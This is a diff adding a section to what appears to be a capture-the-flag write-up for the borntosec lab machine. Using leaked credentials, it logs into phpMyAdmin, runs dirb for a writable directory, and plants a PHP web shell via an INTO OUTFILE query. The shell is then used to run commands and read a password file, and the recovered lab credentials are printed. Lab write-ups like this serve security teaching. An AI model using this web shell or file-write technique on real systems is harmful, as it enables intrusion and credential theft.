@@ -259,3 +259,69 @@ On [Edit Profile](https://192.168.0.21/forum/index.php?mode=user&action=edit_pro
 Using the initial password `!q\]Ej?*5K5cy*AJ` and the `laurie@borntosec.net` allow to connect [webmail](https://192.168.0.21/webmail).
 
 An email from `qudevide@mail.borntosec.net` contains credentials `root/Fg-'kKXBj87E:aJ$` to access DB [phpmyadmin](https://192.168.0.21/phpmyadmin/).
+
+Once logedd into [phpmyadmin](https://192.168.0.21/phpmyadmin/) a [webshell](https://en.wikipedia.org/wiki/Web_shell) can be injected using `OUTFILE` statement. But it requires to find a writtable directory of Apache web server where the webshell can be put in. To do so, `dirb` can be runned on [https://192.168.0.21/forum](https://192.168.0.21/forum).
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ dirb https://192.168.56.101/forum
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Apr  4 10:20:26 2022
+URL_BASE: https://192.168.56.101/forum/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: https://192.168.56.101/forum/ ----
++ https://192.168.56.101/forum/backup (CODE:403|SIZE:295)                                                                           
++ https://192.168.56.101/forum/config (CODE:403|SIZE:295)                                                                           
+==> DIRECTORY: https://192.168.56.101/forum/images/                                                                                 
+==> DIRECTORY: https://192.168.56.101/forum/includes/                                                                               
++ https://192.168.56.101/forum/index (CODE:200|SIZE:4935)                                                                           
++ https://192.168.56.101/forum/index.php (CODE:200|SIZE:4935)                                                                       
+==> DIRECTORY: https://192.168.56.101/forum/js/                                                                                     
+==> DIRECTORY: https://192.168.56.101/forum/lang/                                                                                   
+==> DIRECTORY: https://192.168.56.101/forum/modules/                                                                                
+==> DIRECTORY: https://192.168.56.101/forum/templates_c/                                                                            
+==> DIRECTORY: https://192.168.56.101/forum/themes/                                                                                 
+==> DIRECTORY: https://192.168.56.101/forum/update/                                                                                 
+                                                                                                                                    
+[...]
+                                                                               
+-----------------
+END_TIME: Mon Apr  4 10:20:30 2022
+DOWNLOADED: 4612 - FOUND: 4
+
+```
+
+`/var/www/` is the default installation directory for Apache2 and forum is located inside this directory. So, trying to execute following SQL query allow to write a file into `/var/www/forum/templates_c/`. 
+`templates_c` is a ...
+```sql
+SELECT "<pre><?php system($_GET['cmd'])?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'
+```
+Once the query is executed and confirmation message is prompted `Your SQL query has been executed successfully ( Query took 0.0002 sec )` the webshell can be accessed at [https://192.168.56.101/forum/templates_c/shell.php](https://192.168.56.101/forum/templates_c/shell.php). 
+
+As the PHP super global variable `$_GET` is used to collect data sent in the URL, the parameters `cmd` is sent to shell.php and evaluated by `system()`.
+
+So passing, for example, `id` in `cmd` parameter gives an output of executed command (https://192.168.56.101/forum/templates_c/shell.php?cmd=id)
+```shell
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+```
+From here, find all file belongs to a user called “www-data” in / file system:
+https://192.168.56.101/forum/templates_c/shell.php?cmd=find+/home+-user+www-data
+```
+/home
+/home/LOOKATME
+/home/LOOKATME/password
+```
+Running [cmd=cat /home/LOOKATME/password](https://192.168.56.101/forum/templates_c/pre.php?cmd=cat%20/home/LOOKATME/password) prints the content of the file which is credential to log into `lmezard`.
+```
+lmezard:G!@M6f4Eatau{sF"
+```
